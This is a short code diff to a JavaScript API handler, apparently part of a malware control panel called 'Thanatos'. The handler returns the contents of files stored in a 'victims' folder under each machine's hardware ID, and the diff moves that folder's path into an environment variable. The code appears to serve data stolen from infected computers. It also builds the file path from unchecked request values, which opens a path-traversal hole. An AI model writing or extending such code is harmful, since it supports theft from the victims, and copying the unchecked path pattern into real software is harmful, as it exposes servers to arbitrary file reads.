@@ -15,7 +15,7 @@ export default function handler(
     res.status(400).end();
     return;
   }
-  const file_content = fs.readFileSync('/home/nestyles/Documents/Thanatos/server/victims/' + hwid + '/' + file_name);
+  const file_content = fs.readFileSync(process.env.VICTIMS_PATH + hwid + '/' + file_name);
     /* files.forEach(file => { */
     /* }); */
   res.status(200).json({ file_content : file_content.toString() });
